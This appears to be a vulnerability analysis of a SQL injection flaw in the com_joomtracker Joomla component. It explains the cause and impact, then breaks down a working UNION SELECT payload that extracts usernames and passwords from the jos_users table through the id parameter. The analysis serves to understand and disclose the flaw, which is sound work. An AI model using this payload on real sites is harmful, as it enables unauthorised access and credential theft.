Based on the provided content, here's a breakdown of the vulnerability:

*   **Root Cause:** The vulnerability stems from a lack of proper input sanitization in the `id` parameter within the `tordetails` task of the `com_joomtracker` Joomla component.
*   **Weaknesses/Vulnerabilities:** The primary vulnerability is a SQL Injection (SQLi) flaw. The application directly uses user-supplied input in a SQL query without adequate sanitization or parameterization.
*   **Impact of Exploitation:** By exploiting this vulnerability, an attacker can inject malicious SQL code. In the provided example, the attacker is able to extract usernames and passwords from the `jos_users` table. This can lead to a full compromise of the application and potentially the server itself.
*   **Attack Vectors:** The attack vector is through a crafted HTTP GET request to the vulnerable component, specifically targeting the `index.php` entry point with the `com_joomtracker` component and `tordetails` task, and injecting SQL code through the `id` parameter.
*   **Required Attacker Capabilities/Position:** An attacker only needs to be able to send HTTP requests to the target web application. No specific user privileges are required to exploit this vulnerability.

**Technical Details**

The exploit provided uses a `UNION SELECT` statement in combination with the `id` parameter to extract data from the database. Specifically, it does this:

1.  `index.php?option=com_joomtracker&task=tordetails&id=1`
    *   This is a typical request to view torrent details
2.  `1/**/AND/**/1=2/**/`
    *   This is injected SQL code. The `1=2` will force the original query to return no results
3.  `UNION/**/SELECT/**/0,1,2,3,4,5,6,7,8,9,10,11,12,concat(username,0x3a,password),14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35`
    *   This `UNION SELECT` statement selects data and the `concat` function will combine the usernames and passwords from the table
4.  `from/**/jos_users/*`
    *   This specifies the `jos_users` table as the source of the data.

The exploit then uses the `concat` function to retrieve the username and password values separated by a colon (`:`).
